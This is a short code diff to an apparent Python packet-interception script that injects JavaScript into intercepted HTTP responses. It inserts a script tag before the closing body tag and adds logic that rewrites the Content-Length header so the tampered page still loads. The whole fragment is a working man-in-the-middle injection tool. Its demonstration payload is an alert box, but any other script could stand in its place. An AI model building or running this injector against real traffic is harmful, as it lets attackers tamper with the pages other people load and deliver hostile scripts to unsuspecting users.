@@ -51,9 +51,24 @@ def process_packet(packet):
                 print("[+] Response")
 
                 if decoded_load_str.find("</body>") > -1:
+                    injection_code = "<script>alert('hacked')</script>"
+
                     decoded_load_str = decoded_load_str.replace(
-                        "</body>", "<script>alert('hacked')</script></body>"
+                        "</body>", injection_code + "</body>"
                     )
+
+                    content_length_search = re.search(
+                        "(?:Content-Length:\s)(\d*)", decoded_load_str
+                    )
+
+                    if content_length_search and "text/html" in decoded_load_str:
+                        content_length = content_length_search.group(1)
+                        new_content_length = int(content_length) + len(injection_code)
+
+                        decoded_load_str = decoded_load_str.replace(
+                            content_length, str(new_content_length)
+                        )
+
                     new_packet = set_load(scapy_packet, decoded_load_str)
                     print(new_packet.show())
                     packet.set_payload(new_packet.build())
